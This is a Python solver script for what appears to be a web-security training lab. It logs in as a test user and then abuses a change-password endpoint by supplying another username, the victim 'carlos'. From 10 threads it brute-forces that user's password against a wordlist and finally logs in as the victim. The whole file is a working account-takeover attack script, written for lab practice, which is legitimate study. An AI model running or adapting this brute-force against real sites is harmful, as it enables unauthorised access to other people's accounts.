import requests
from colorama import Fore, Style, init
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, Lock


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.passwords_file = 'passwords.txt'
        self.passwords = []
        self.victim_username = 'carlos'
        self.victim_password = None
        self.found = Event()
        self.lock = Lock()

    def open_passwords_file(self):
        with (open(self.passwords_file) as file):
            for password in file.readlines():
                password = password.strip()
                self.passwords.append(password)

    def sign_in_as_wiener(self):
        data = {
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def brute_force_victim_password(self, current_password):
        if self.found.is_set():
            return
        data = {
            'username': self.victim_username,
            'current-password': current_password,
            'new-password-1': 'hacker1',
            'new-password-2': 'hacker2'
        }
        response = self.session.post(self.lab_url + 'my-account/change-password', data=data)
        with self.lock:
            if self.found.is_set():
                return
            if 'Current password is incorrect' not in response.text:
                self.victim_password = current_password
                print(Fore.GREEN + '[+] ' + Style.RESET_ALL + current_password)
                self.found.set()
            else:
                print(Fore.RED + '[-] ' + Style.RESET_ALL + current_password)

    def brute_force_victim_passwords(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.brute_force_victim_password, password) for password in self.passwords]
            for _ in as_completed(futures):
                if self.found.is_set():
                    break

    def sign_in_as_vitim(self):
        data = {
            'username': self.victim_username,
            'password': self.victim_password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.open_passwords_file()
        self.sign_in_as_wiener()
        self.brute_force_victim_passwords()
        self.sign_in_as_vitim()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
